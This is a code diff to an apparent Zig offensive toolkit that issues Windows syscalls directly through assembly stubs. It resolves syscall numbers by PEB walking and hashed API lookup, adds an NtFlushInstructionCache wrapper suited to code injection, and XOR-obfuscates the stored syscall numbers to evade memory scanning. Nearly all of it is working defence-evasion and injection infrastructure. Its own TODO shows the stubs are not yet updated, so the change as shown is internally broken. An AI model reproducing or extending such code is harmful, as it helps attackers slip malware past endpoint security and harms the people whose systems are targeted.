@@ -3,6 +3,7 @@ const types = @import("../types/types.zig");
 const hash = @import("../types/hash.zig");
 const peb_walk = @import("../types/peb_walk.zig");
 const export_resolve = @import("../types/export_resolve.zig");
+const config = @import("config");
 
 comptime {
     _ = @import("stubs.zig");
@@ -38,6 +39,7 @@ pub export var ssn_NtOpenProcess: u32 = 0;
 pub export var ssn_NtResumeThread: u32 = 0;
 pub export var ssn_NtSuspendThread: u32 = 0;
 pub export var ssn_NtDeleteFile: u32 = 0;
+pub export var ssn_NtFlushInstructionCache: u32 = 0;
 
 // ── Extern stubs (defined in stubs.zig via comptime global asm) ──
 extern fn NtAllocateVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
@@ -70,6 +72,7 @@ extern fn NtOpenProcess_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u6
 extern fn NtResumeThread_stub(a1: u64, a2: u64) callconv(.c) u64;
 extern fn NtSuspendThread_stub(a1: u64, a2: u64) callconv(.c) u64;
 extern fn NtDeleteFile_stub(a1: u64) callconv(.c) u64;
+extern fn NtFlushInstructionCache_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;
 
 const ntdll_dll_hash: u32 = hash.encryptedHashModule("ntdll.dll");
 const win32u_dll_hash: u32 = hash.encryptedHashModule("win32u.dll");
@@ -155,7 +158,10 @@ fn resolveSsn(ntdll_base: types.PVOID, func_hash: u32) ?u32 {
 
 fn resolveAndAssign(ntdll_base: types.PVOID, comptime name_hash: u32, ssn_ptr: *u32) bool {
     if (resolveSsn(ntdll_base, name_hash)) |ssn| {
-        ssn_ptr.* = ssn;
+        // SSNs stored XOR-obfuscated — at-rest encrypted in the globals.
+        // TODO: update the 29 asm stubs in stubs.zig to deobfuscate (eax ^ SSN_XOR_KEY)
+        // before the syscall instruction, so the key is never in the clear.
+        ssn_ptr.* = ssn ^ config.SSN_XOR_KEY;
         return true;
     }
     return false;
@@ -194,6 +200,7 @@ ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenProcess"), &ss
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtResumeThread"), &ssn_NtResumeThread);
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSuspendThread"), &ssn_NtSuspendThread);
 ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtDeleteFile"), &ssn_NtDeleteFile);
+ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtFlushInstructionCache"), &ssn_NtFlushInstructionCache);
 return ok;
 }
 
@@ -578,5 +585,17 @@ pub fn NtSetInformationFile(
         @intFromPtr(FileInformation),
         Length,
         @intFromPtr(FileInformationClass),
+    )));
+}
+
+pub fn NtFlushInstructionCache(
+    ProcessHandle: types.HANDLE,
+    BaseAddress: types.PVOID,
+    NumberOfBytesToFlush: types.SIZE_T,
+) types.NTSTATUS {
+    return @as(types.NTSTATUS, @intCast(NtFlushInstructionCache_stub(
+        @intFromPtr(ProcessHandle),
+        @intFromPtr(BaseAddress),
+        NumberOfBytesToFlush,
     )));
 }
